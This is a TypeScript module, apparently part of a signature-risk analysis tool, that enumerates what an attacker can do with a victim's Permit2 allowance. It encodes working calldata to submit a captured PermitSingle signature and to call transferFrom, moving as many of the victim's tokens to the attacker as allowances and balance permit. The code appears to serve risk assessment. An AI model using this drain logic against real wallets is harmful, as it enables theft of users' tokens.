import { encodeFunctionData, PublicClient } from "viem";
import { Action, Permit2AllowanceCapability } from "../capability/types.js";
import { PERMIT2_ABI, ERC20_ABI } from "../capability/abis.js";

export class Permit2AllowanceSemantics {
  static async enumerateActions(
    capability: Permit2AllowanceCapability,
    client: PublicClient,
    attacker: `0x${string}`
  ): Promise<Action[]> {
    const actions: Action[] = [];
    const token = capability.details.token;
    const owner = capability.owner;
    const permit2 = capability.permit2Address;

    // 1. Read on-chain state from Permit2
    const [allowedAmount, expiration, currentNonce] = await client.readContract({
      address: permit2,
      abi: PERMIT2_ABI,
      functionName: "allowance",
      args: [owner, token, capability.spender]
    });

    // 2. Read victim's ERC20 balance and allowance to Permit2
    const victimBalance = await client.readContract({
      address: token,
      abi: ERC20_ABI,
      functionName: "balanceOf",
      args: [owner]
    });

    const tokenApprovalToPermit2 = await client.readContract({
      address: token,
      abi: ERC20_ABI,
      functionName: "allowance",
      args: [owner, permit2]
    });

    // Action Type 1: Can the attacker submit the PermitSingle?
    // Valid if current on-chain nonce matches signed nonce
    if (currentNonce === capability.details.nonce) {
      const permitCalldata = encodeFunctionData({
        abi: PERMIT2_ABI,
        functionName: "permit",
        args: [
          owner,
          {
            details: {
              token: capability.details.token,
              amount: capability.details.amount,
              expiration: capability.details.expiration,
              nonce: capability.details.nonce
            },
            spender: capability.spender,
            sigDeadline: capability.sigDeadline
          },
          capability.signature
        ]
      });

      actions.push({
        id: "Permit2.permit",
        description: `Relayer/Attacker broadcasts PermitSingle to grant ${capability.details.amount} allowance`,
        target: permit2,
        calldata: permitCalldata,
        value: 0n,
        actor: attacker
      });
    }

    // Action Type 2: Can the attacker call transferFrom?
    // Valid if allowedAmount > 0 and tokenApprovalToPermit2 > 0 and victimBalance > 0
    if (allowedAmount > 0n && tokenApprovalToPermit2 > 0n && victimBalance > 0n) {
      // Drain up to min(allowedAmount, victimBalance, tokenApprovalToPermit2)
      let drainAmount = allowedAmount;
      if (victimBalance < drainAmount) drainAmount = victimBalance;
      if (tokenApprovalToPermit2 < drainAmount) drainAmount = tokenApprovalToPermit2;

      if (drainAmount > 0n) {
        const transferCalldata = encodeFunctionData({
          abi: PERMIT2_ABI,
          functionName: "transferFrom",
          args: [owner, attacker, drainAmount, token]
        });

        actions.push({
          id: "Permit2.transferFrom",
          description: `Attacker calls transferFrom to drain ${drainAmount} tokens`,
          target: permit2,
          calldata: transferCalldata,
          value: 0n,
          actor: attacker
        });
      }
    }

    return actions;
  }
}
